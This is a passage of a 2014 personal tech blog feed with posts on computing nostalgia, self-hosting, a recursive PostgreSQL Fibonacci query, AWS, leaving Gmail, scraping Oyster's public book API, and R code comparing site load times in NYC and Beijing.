   <id>http://dangoldin.com/2014/04/12/my-computer-experience</id>
   <content:encoded><![CDATA[
<p>I’ve been thinking about my history with computers and the impact they’ve had on me. I grew up just as computers were becoming mainstream, the spread of the internet coincided with my teens, saw the rise of “Web 2.0” during college, and got my first smart phone a few years after college. It’s fascinating to think about how much has happened to the world since the rise of computers and the varying experiences everyone’s had.</p>

<p>Nearly everyone has experienced the internet but at completely different points. Some experienced it when it was just text and had to use Archie, Gopher, and telnet to discover and consume content. Others joined through the AOL floppy discs and had to get multiple land lines in order to connect over dial up. Others avoided it for as long as possible but got dragged in when joining an office. And others are only getting seeing it now due to the spread of smartphones. Age is a huge part of the experience too. First using the internet as a child is different than using it as an adult. We have our own experiences that affect our interaction and dictate the experience we’ll have.</p>

<p>Each experience comes with its pros and cons but I’m happy where my experience fell on the spectrum. I got to deal with the joys of DOS, floppy disks and 16 colors and was able to experience the early days of the internet with a 14.4k modem and Lycos. I do wish I could see what it was like to code in the 70s and 80s when the engineering world was much smaller and one had to deal with a ton of constraints that we currently take for granted.</p>

<p>I wonder whether future generations will have similar experiences to what I had or whether technological advances will either be too predictable and make change appear gradual or not significant enough to warrant attention. I believe I got lucky since so many of the advances were consumer oriented and pro-hacker. Hopefully that the future brings more of the same.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Self hosted services</title>
   <link href="http://dangoldin.com/2014/04/07/self-hosted-services/"/>
   <updated>2014-04-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/04/07/self-hosted-services</id>
   <content:encoded><![CDATA[
<p>It never bothered me when apps were acquired and shut down but the <a href="https://readmill.com/epilogue" target="_blank">Readmill news</a> hit me hard. It was one of the truly “free” ebook readers and never got in my way. It fit my behavior perfectly - I would download my books from wherever, drag them into the Readmill web app, and have them permanently accessible on my iPad after a quick sync.</p>

<p>My first reaction was wishing that it would be open sourced but that got me thinking about third party services. Numerous people have been saying how dangerous it is to rely on third party services but until Readmill it never really mattered to me. Sure, in the abstract it’s better to have everything hosted on your own but in reality it’s impossible to get to the same level of quality and experience for everything we use. We’re constantly balancing tradeoffs and we’re biased to favor the short term factors, such as ease of use and simplicity of set up, rather than long term ones, such as privacy, control, and data ownership.</p>

<p>I did some research on self hosting and came across <a href="http://sandstorm.io/" target="_blank">Sandstorm</a> - it’s pitched as a “personal cloud platform” and seems to be the solution to this reliance on third party apps. The idea behind it is that you have your own server and can download and install various cloud apps that will then have access to whatever data you give them. I’m eager to try this out. In the case of a Readmill replacement - I’d love to be able to host something on my own server to act as the backend and then download an iPad app that can connect to it. Both the iPad app and server can still be updated as new versions are rolled out but there’s no risk of the apps being shut down.</p>

<p>The business model would resemble Wordpress. The technology itself would be open source but if someone doesn’t want to run their own server they can pay to have their apps hosted somewhere else. There’s also room for a marketplace of premium or specialty apps that can be sold similar to the way themes and plugins are sold for Wordpress. People are already buying apps on the various app stores - it’s not a big leap to imagine people purchasing apps for their personal servers.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>PostgreSQL Fibonacci</title>
   <link href="http://dangoldin.com/2014/04/04/postgresql-fibonacci/"/>
   <updated>2014-04-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/04/04/postgresql-fibonacci</id>
   <content:encoded><![CDATA[
<p>Earlier today I was researching whether it was possible to generate Fibonacci numbers using a SQL query. A Google search turned up a <a href="http://pgsql.inb4.se/2009/march/fibonacci-sequence-using-with-recursive.html" target="_blank">short PostgreSQL</a> query that uses a recursive approach. Since this is recursion, the query starts by defining a base case and then goes on to define a generation step with a stopping limit.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">with</span> <span class="k">recursive</span> <span class="n">f</span> <span class="k">as</span> <span class="p">(</span>
    <span class="k">select</span> <span class="mi">0</span> <span class="k">as</span> <span class="n">a</span><span class="p">,</span> <span class="mi">1</span> <span class="k">as</span> <span class="n">b</span>
    <span class="k">union</span> <span class="k">all</span>
    <span class="k">select</span> <span class="n">b</span> <span class="k">as</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="o">+</span><span class="n">b</span> <span class="k">from</span> <span class="n">f</span> <span class="k">where</span> <span class="n">a</span> <span class="o">&lt;</span> <span class="mi">100000</span>
<span class="p">)</span> <span class="k">select</span> <span class="n">a</span> <span class="k">from</span> <span class="n">f</span></code></pre></figure>

<p>It’s interesting to see the edge features of a language and I find that query languages tend to have the most striking ones. My experience with the various SQLs has been that at the basic level they’re very similar but diverge significantly at the edges.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>AWS is about infrastructure optionality</title>
   <link href="http://dangoldin.com/2014/03/30/aws-is-about-infrastructure-optionality/"/>
   <updated>2014-03-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/03/30/aws-is-about-infrastructure-optionality</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/aws-services.png" alt="AWS services" width="1107" height="383" layout="responsive"/>

<p>Every time Amazon announces a price drop there are always people pointing out that it’s still more expensive than other cloud computing services such as Linode or Digital Ocean. The Amazon fans then respond by saying sure AWS is more expensive but the value is the ability to scale quickly when needed.</p>

<p>For me, the biggest value behind AWS is the ecosystem and the included optionality. When building large scale web services it’s tough to know every issue you will run into and more often than not your needs and implementation will change. AWS provides a ton of available tools that make growing and scaling easier beyond the hardware itself. You may start with using EC2 for your server and S3 for hosting your static assets but over time you may start using Cloudfront as a CDN and Redshift for your analytics and EMR to process your various logs. That’s the biggest value in AWS - not being able to launch new machines quickly but having a set of infrastructure options that can be specialized to fit your needs.</p>

<p>It used to be that the physical hardware was orders of magnitude more expensive than engineers but this hasn’t been true for decades now - it’s perfectly reasonable to look for ways to reduce yours costs especially if it can be done quickly but obsessing over hardware costs, especially while you’re still growing, is a red herring. Building large systems is tough and the fewer things you have to worry about the better - using AWS reduces the chance that you will run into a scenario where you’re just not able to do something without changing your host and rewriting your architecture.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Hacker lore</title>
   <link href="http://dangoldin.com/2014/03/28/hacker-lore/"/>
   <updated>2014-03-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/03/28/hacker-lore</id>
   <content:encoded><![CDATA[
<p>I’ve always been interested in hacker lore and have recently started compiling a list of tech-related stories and anecdotes that I found amusing. My ideal story includes an odd, somewhat ridiculous, situation that required a bit of technical ingenuity to solve while highlighting an arcane corner case and providing some glee.</p>

<p>So far, I’ve only been able to recall and find two such anecdotes but will add more as I discover them. Depending on how many I gather I may put together a permament list page. If you have any to contribute let me know and I’ll add them to this post.</p>

<p>The two so far:</p>

<ul class="bulleted">
  <li><a href="http://nedbatchelder.com/blog/200811/print_this_file_your_printer_will_jam.html" target="_blank">Print this file, your printer will jam</a></li>
  <li><a href="http://www.ibiblio.org/harris/500milemail.html" target="_blank">The case of the 500-mile email</a></li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Visualizing my browsing history</title>
   <link href="http://dangoldin.com/2014/03/25/visualizing-my-browsing-history/"/>
   <updated>2014-03-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/03/25/visualizing-my-browsing-history</id>
   <content:encoded><![CDATA[
<p>I came across a neat Chrome extension called <a href="http://shan-huang.com/browserdatavis/">Iconic History</a> that generates a history of your browsing history through favicons. The value of a good visualization is that it’s able to quickly provide a new perspective to something that seemed mundane and forgotten. I’ve looked at my browser history numerous times and but never thought much of it until I looked at the pattern of icons. It’s obvious that my usage occurs in bursts - I will go through multiple emails when going through my inbox or refining a search. My usage has also changed since I stopped using Gmail for my personal email and started using Fastmail. There’s the occasional new site but for the most part I’m a creature of habits - email, search, facebook, and Hacker News constitute the bulk of my internet activity. I’m honestly surprised by how much activity is taken up by a few sites. I suspect most people are similar - a few sites make up the majority of the page views. It would be great to see what this looks like for others and see if any general patterns emerge - I’m sure almost everyone people will have some mix of email, search, and Facebook but I’m curious to see what the outliers are.</p>

<p><a href="http://dangoldin.com/assets/static/images/iconic-history.png"></a></p>
<img src="http://dangoldin.com/assets/static/images/iconic-history.png" alt="Iconic history" width="1372" height="778" layout="responsive"/>
<p>&lt;/a&gt;</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Goodbye Gmail</title>
   <link href="http://dangoldin.com/2014/03/18/goodbye-gmail/"/>
   <updated>2014-03-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/03/18/goodbye-gmail</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/why-is-gmail.png" alt="Why is gmail so slow?" width="496" height="194" layout="responsive"/>
<p><br /></p>

<p>Over the course of the past year I’ve become more and more pissed off at Gmail. I loved using Gmail when it launched - it made writing and reading email a pleasure. It was simple, clean, and responsive. Now it’s the opposite. All actions feel slow. The initial page load takes a substantial amount of time and then I get to wait for the various page elements to load - including a chat list that I’m almost never signed into and integration with a slew of other Google products. Loading emails or new tabs is noticeably slow and the search is sluggish for a company whose main product is a search engine.</p>

<p>This past weekend I decided to see what was out there and discovered <a href="https://www.fastmail.fm/" target="_blank">Fastmail</a>. I’ve been using over the past few days and it’s been great. Emails are quick to load and send and the navigation feels snappy and responsive. I’m not sure how well it will work as my inbox grows but so far I’m impressed. It feels like Gmail when it launched almost 10 years ago. It feels odd to describe it in terms of Gmail since I’m bashing it but I can’t think of a better way.</p>

<p>I did a quick anecdotal test by looking at the networks tab in Google chrome as each loaded. Gmail loaded in 6 seconds after making nearly 150 requests and retrieving 338 kb while Fastmail loaded in a little over 300 milliseconds after making 18 requests and retrieving 128 kb. Repeating this a few times showed similar results. Others seem to be having the same issue since Google’s first auto-suggestion is “why is gmail so slow” when typing in “why is gmail”. The switch is also much simpler than I expected - I just have Gmail forwarding everything to my Fastmail account and it’s completely transparent to the outside world. In the future I plan on migrating everything to use my new email address but for now this is a good intermediate step. I haven’t heard much from others moving away from Gmail so I’d love to hear your experiences if you made the switch.</p>

<img src="http://dangoldin.com/assets/static/images/gmail-load.png" alt="Gmail load times" width="503" height="16" layout="responsive"/>
<img src="http://dangoldin.com/assets/static/images/fastmail-load.png" alt="Fastmail load times" width="510" height="20" layout="responsive"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Fun with the Oyster books API</title>
   <link href="http://dangoldin.com/2014/03/16/fun-with-the-oyster-books-api/"/>
   <updated>2014-03-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/03/16/fun-with-the-oyster-books-api</id>
   <content:encoded><![CDATA[
<p>I’m an avid reader and signed up for <a href="http://oysterbooks.com/" target="_blank">Oyster</a> as soon as I discovered them. Since then, every time I wanted to read a new book my first step has been to check Oyster. If the book wasn’t available I’d get it the old fashioned way and read it via Readmill, another great app.</p>

<p>One feature I wish Oyster had was the ability to see the overlap between their available collection and what I had in my “to read” list. The only way to do this now is to go through my list one book at a time and then search for it using the Oyster iOS app since the search functionality isn’t available via the web. Being lazy, I really didn’t want to do this and started searching for a quicker way. By browsing their website and looking at the network requests in Chrome I noticed two interesting API calls being made - one to get the book “sets” and another to get the books with a set.</p>

<p>These API endpoints turned out to be publicly accessible and it only took a short Python <a href="https://github.com/dangoldin/oyster-books-crawl" target="_blank">script</a> to retrieve the books and dump them into a CSV file. This got me a little less than 3,000 books - turns out that the publicly accessible data is only a fraction of the entire collection and my endeavour wasn’t as fruitful as hoped.</p>

<p>I did manage to get a set of over 4,000 books and decided to have fun with it.</p>

<ul class="thumbnails">
  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/oyster-authors-by-num-books.png">
        <img src="http://dangoldin.com/assets/static/images/oyster-authors-by-num-books.png" alt="# of authors by # of books written" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Num of authors by num of books written.</strong> Very few others appear more than once in the data set. This may be due to the limited data set or Oyster's job in editing the publicly accessible collections, maybe both.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/oyster-authors-author-ratings.png">
        <img src="http://dangoldin.com/assets/static/images/oyster-authors-author-ratings.png" alt="Distribution of ratings" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Distribution of ratings.</strong> Ratings are clustered around 4 with very few ratings under 3. This is most likely a biased set since the Oyster editors would have chosen the highest rated books to be featured in their sets.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/oyster-authors-num-books-by-author.png">
        <img src="http://dangoldin.com/assets/static/images/oyster-authors-num-books-by-author.png" alt="Distribution of ratings" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Num of books by author.</strong> Kurt Vonnegut has over 20 books available on Oyster with Shakespeare in the number 2 spot.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/oyster-authors-box-plot-rating-by-author.png">
        <img src="http://dangoldin.com/assets/static/images/oyster-authors-box-plot-rating-by-author.png" alt="Ratings by author" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Ratings by author box plot.</strong> Just a quick box plot to see the rating distribution by author.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/oyster-authors-num-books-vs-rating.png">
        <img src="http://dangoldin.com/assets/static/images/oyster-authors-num-books-vs-rating.png" alt="# of books vs rating" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Rating vs # of books.</strong> Doesn't look as if the # of books an author has written on Oyster has any relationship with their rating. I thought maybe authors with higher average ratings would appear more frequently.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/oyster-authors-author-ratings-over-time.png">
        <img src="http://dangoldin.com/assets/static/images/oyster-authors-author-ratings-over-time.png" alt="Rating over time by author" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Rating over time by author.</strong> This was a reach but I wanted to see whether an author was most likely to have better ratings earlier or later in his or her career. In this case it looks as if the publish date isn't the original authorship date so not a very useful analysis.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/oyster-pub-ratings.png">
        <img src="http://dangoldin.com/assets/static/images/oyster-pub-ratings.png" alt="Publisher ratings" width="600" height="1200" layout="responsive"/>
      </a>
      <p>
        <strong>Publisher ratings.</strong> Similar to authors, we can take a look to see whether some publishers have significantl higher ratings than others. This is a bit more useful since there's a lot more data per publisher than there is per author. I couldn't make much sense of the results here.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/oyster-num-pages-by-decade.png">
        <img src="http://dangoldin.com/assets/static/images/oyster-num-pages-by-decade.png" alt="# of pages by decade" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Avg number of pages by decade.</strong> I wanted to see whether books were getting longer or shorter so did a quick plot of the average number of published pages by decade since the year was too fine. The publish dates aren't entirely accurate so I wouldn't read too much into this.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/oyster-rating-by-decade.png">
        <img src="http://dangoldin.com/assets/static/images/oyster-rating-by-decade.png" alt="Avg rating by decade" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Avg rating by decade.</strong> Similar to the previous plot but looking at the average rating rather than the number of pages. Seems to be pretty steady to me although this may be due to the dataset being a curated list of top books.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/oyster-rating-vs-date.png">
        <img src="http://dangoldin.com/assets/static/images/oyster-rating-vs-date.png" alt="Rating vs date" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Rating vs date.</strong> Another way to look at the previous plot but plotting each book rather than the average by decade. Not much going on here although this may be due to the biased dataset and flawed publish dates.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/oyster-rating-vs-pages.png">
        <img src="http://dangoldin.com/assets/static/images/oyster-rating-vs-pages.png" alt="Rating vs # pages" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Rating vs number of pages.</strong> This is an interesting one - are longer books more popular? Most of the books are clustered around a couple of hundred pages but longer books do tend to have a higher average rating. I'm not sure why this would be the case but would guess that only someone who's already interested in a long book would read it or stick with it enough to leave a review.
      </p>
    </div>
  </li>
</ul>

<p>As usual, the code’s up on <a href="https://github.com/dangoldin/oyster-books-crawl" target="_blank">GitHub</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Website load times: NYC vs Beijing</title>
   <link href="http://dangoldin.com/2014/03/11/website-load-times-nyc-vs-beijing/"/>
   <updated>2014-03-11T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/03/11/website-load-times-nyc-vs-beijing</id>
   <content:encoded><![CDATA[
<p>Over the weekend I wrote a quick script to crawl the top 100 Alexa sites and <a href="http://dangoldin.com/2014/03/09/examining-the-requests-made-by-the-top-100-sites/">compare them</a> against one another in terms of load times and resources being loaded. I shared my code on GitHub and earlier today I got a great pull request from <a href="https://github.com/rahimnathwani" target="_blank">rahimnathwani</a> who ran the script in Beijing, using home ADSL, and wanted to share his dataset.</p>

<p>I suspected that that many sites were loading slowly for me due to my geographical distance from them and with this dataset we’re able to compare the load times between NYC and Beijing for these sites. Unsurprisingly, most sites in Asia do load faster in Beijing but the average load time is much longer, 3.4 seconds in NYC vs 11 seconds in Beijing. A surprise was how slowly rakuten.co.jp loaded in Beijing - over 50 seconds on average and I suspect this is due to the huge number of images being loaded. I suspect internet speeds also played a part in the differences here so this isn’t a perfect comparison.</p>

<p>Below are some visualizations highlighting the differences in a few different ways. I’d love to get my hands on more data so if fee free to submit a <a href="https://github.com/dangoldin/site-analysis" target="_blank">pull request</a> with your data and I’ll rerun the analysis. I’ve also included the R code that generate the plots below for those curious to see how they were done.</p>

<ul class="thumbnails">
  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-comparison-parallel.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-comparison-parallel.png" alt="Load times parallel plot" width="600" height="800" layout="responsive"/>
      </a>
      <p>
        <strong>Parallel plot.</strong> The idea here is to see whether the lines are mostly horizontal or if they're steep. Horizontal lines would indicate that sites are universally slow (and fast) while steep lines indicate that some sites load much faster in one city compared to the other.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-comparison-time-diff-bar.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-comparison-time-diff-bar.png" alt="Load time differeneces parallel plot" width="600" height="1200" layout="responsive"/>
      </a>
      <p>
        <strong>Load time differences.</strong> Here we sort the sites by the difference in average load time, NYC minus Beijing. Most of the sites loaded faster in NYC but I suspect the biggest reason was due to internet speed differences. The sites that loaded faster in Beijing are for the most part in China.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-comparison-scatter.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-comparison-scatter.png" alt="Load times scatter" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Scatter plot.</strong> A different perspective than the parallel plot but trying to answer the same question. We do notice a few outliers here which we can investigate by adding text labels.
      </p>
    </div>
  </li>

  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-comparison-scatter-text.png">
        <img src="http://dangoldin.com/assets/static/images/crawl-stats-comparison-scatter-text.png" alt="Load times scatter with text" width="600" height="600" layout="responsive"/>
      </a>
      <p>
        <strong>Labeled scatter plot.</strong> This provides a nice look at the outliers but makes it impossible to look at the sites that loaded quickly in both NYC and Beijing.
      </p>
    </div>
  </li>
</ul>

<figure class="highlight"><pre><code class="language-r" data-lang="r"><span class="n">times</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">read.csv</span><span class="p">(</span><span class="s2">"out-times-beijing.csv"</span><span class="p">,</span><span class="w"> </span><span class="n">sep</span><span class="o">=</span><span class="s2">"\t"</span><span class="p">,</span><span class="w"> </span><span class="n">col.names</span><span class="o">=</span><span class="nf">c</span><span class="p">(</span><span class="s2">"url"</span><span class="p">,</span><span class="w"> </span><span class="s2">"time"</span><span class="p">))</span><span class="w">
</span><span class="n">times</span><span class="o">$</span><span class="n">url</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">as.character</span><span class="p">(</span><span class="n">times</span><span class="o">$</span><span class="n">url</span><span class="p">)</span><span class="w">
</span><span class="n">final</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">ddply</span><span class="p">(</span><span class="n">times</span><span class="p">,</span><span class="o">~</span><span class="n">url</span><span class="p">,</span><span class="n">summarise</span><span class="p">,</span><span class="n">mean_time_beijing</span><span class="o">=</span><span class="n">mean</span><span class="p">(</span><span class="n">time</span><span class="p">),</span><span class="n">sd_time_beijing</span><span class="o">=</span><span class="n">sd</span><span class="p">(</span><span class="n">time</span><span class="p">))</span><span class="w">

</span><span class="n">times2</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">read.csv</span><span class="p">(</span><span class="s2">"out-times.csv"</span><span class="p">,</span><span class="w"> </span><span class="n">sep</span><span class="o">=</span><span class="s2">"\t"</span><span class="p">,</span><span class="w"> </span><span class="n">col.names</span><span class="o">=</span><span class="nf">c</span><span class="p">(</span><span class="s2">"url"</span><span class="p">,</span><span class="w"> </span><span class="s2">"time"</span><span class="p">))</span><span class="w">
</span><span class="n">times2</span><span class="o">$</span><span class="n">url</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">as.character</span><span class="p">(</span><span class="n">times2</span><span class="o">$</span><span class="n">url</span><span class="p">)</span><span class="w">
</span><span class="n">final2</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">ddply</span><span class="p">(</span><span class="n">times2</span><span class="p">,</span><span class="o">~</span><span class="n">url</span><span class="p">,</span><span class="n">summarise</span><span class="p">,</span><span class="n">mean_time_nyc</span><span class="o">=</span><span class="n">mean</span><span class="p">(</span><span class="n">time</span><span class="p">),</span><span class="n">sd_time_nyc</span><span class="o">=</span><span class="n">sd</span><span class="p">(</span><span class="n">time</span><span class="p">))</span><span class="w">

</span><span class="n">combined</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">merge</span><span class="p">(</span><span class="n">final</span><span class="p">,</span><span class="n">final2</span><span class="p">,</span><span class="n">by</span><span class="o">=</span><span class="s2">"url"</span><span class="p">)</span><span class="w">
</span><span class="n">combined</span><span class="o">$</span><span class="n">time_diff</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">combined</span><span class="o">$</span><span class="n">mean_time_nyc</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">combined</span><span class="o">$</span><span class="n">mean_time_beijing</span><span class="w">
</span><span class="n">combined.m</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">melt</span><span class="p">(</span><span class="n">combined</span><span class="p">,</span><span class="w"> </span><span class="n">id.vars</span><span class="o">=</span><span class="nf">c</span><span class="p">(</span><span class="s1">'url'</span><span class="p">),</span><span class="w"> </span><span class="n">measure.vars</span><span class="o">=</span><span class="nf">c</span><span class="p">(</span><span class="s1">'mean_time_beijing'</span><span class="p">,</span><span class="w"> </span><span class="s1">'mean_time_nyc'</span><span class="p">))</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'crawl-stats-comparison-parallel.png'</span><span class="p">,</span><span class="w"> </span><span class="n">width</span><span class="o">=</span><span class="m">600</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="o">=</span><span class="m">600</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">combined.m</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_line</span><span class="p">(</span><span class="n">aes</span><span class="p">(</span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">variable</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="n">group</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">url</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_tufte</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s2">"Load Time (ms)"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">xlab</span><span class="p">(</span><span class="s2">""</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'crawl-stats-comparison-time-diff-bar.png'</span><span class="p">,</span><span class="w"> </span><span class="n">width</span><span class="o">=</span><span class="m">600</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="o">=</span><span class="m">600</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">combined</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="n">reorder</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="n">time_diff</span><span class="p">),</span><span class="w"> </span><span class="n">y</span><span class="o">=</span><span class="n">time_diff</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_bar</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_tufte</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">coord_flip</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s2">"Load Time Diff (ms)"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s2">"URL"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'crawl-stats-comparison-scatter.png'</span><span class="p">,</span><span class="w"> </span><span class="n">width</span><span class="o">=</span><span class="m">600</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="o">=</span><span class="m">600</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">combined</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="n">mean_time_beijing</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="o">=</span><span class="n">mean_time_nyc</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_point</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_tufte</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s2">"Beijing Load Time (ms)"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s2">"NYC Load Time (ms)"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span><span class="w">

</span><span class="n">png</span><span class="p">(</span><span class="s1">'crawl-stats-comparison-scatter-text.png'</span><span class="p">,</span><span class="w"> </span><span class="n">width</span><span class="o">=</span><span class="m">600</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="o">=</span><span class="m">600</span><span class="p">)</span><span class="w">
</span><span class="n">ggplot</span><span class="p">(</span><span class="n">combined</span><span class="p">,</span><span class="w"> </span><span class="n">aes</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="n">mean_time_beijing</span><span class="p">,</span><span class="w"> </span><span class="n">y</span><span class="o">=</span><span class="n">mean_time_nyc</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">geom_text</span><span class="p">(</span><span class="n">aes</span><span class="p">(</span><span class="n">label</span><span class="o">=</span><span class="n">url</span><span class="p">),</span><span class="w"> </span><span class="n">size</span><span class="o">=</span><span class="m">3</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">theme_tufte</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">xlab</span><span class="p">(</span><span class="s2">"Beijing Load Time (ms)"</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w">
  </span><span class="n">ylab</span><span class="p">(</span><span class="s2">"NYC Load Time (ms)"</span><span class="p">)</span><span class="w">
</span><span class="n">dev.off</span><span class="p">()</span></code></pre></figure>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Examining the requests made by the top 100 sites</title>
   <link href="http://dangoldin.com/2014/03/09/examining-the-requests-made-by-the-top-100-sites/"/>
   <updated>2014-03-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/03/09/examining-the-requests-made-by-the-top-100-sites</id>
   <content:encoded><![CDATA[
<p>Since writing the <a href="http://dangoldin.com/2013/12/01/drowning-in-javascript/">Drowning in JavaScript</a> post I’ve been meaning to take a stab at automating that analysis and seeing if I could generate some other insights. This weekend I finally got around to writing a quick PhantomJS script to load the top 100 Alexa sites and capture each of the linked resources as well as their type. The resulting data set contains the time it took the entire page to load as well as the content type for each of the linked files. After loading these two datasets into R and doing a few simple transformations we can get some interesting results.</p>

<ul class="thumbnails">
  <li>
    <div class="thumbnail">
      <a href="http://dangoldin.com/assets/static/images/crawl-stats-times-mean.png">
